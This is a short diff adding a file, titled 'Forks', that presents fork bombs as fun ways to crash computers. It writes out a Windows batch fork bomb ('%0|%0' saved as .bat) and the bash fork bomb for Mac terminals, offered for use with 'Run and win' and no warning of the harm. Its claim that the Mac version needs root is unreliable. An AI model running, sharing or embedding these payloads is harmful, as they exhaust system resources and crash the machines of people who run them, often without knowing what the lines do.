@@ -1,0 +1,17 @@
+Forks
+
+Pretty cool little things that crash computers by creating infinite processes
+
+
+
+
+On Windows:
+
+Open notepad, type "%0|%0" and save with .bat extension. Run and win
+
+
+
+
+On Mac:
+
+You need root permissions to have this actually work: in terminal type ":(){ :|:& };:"
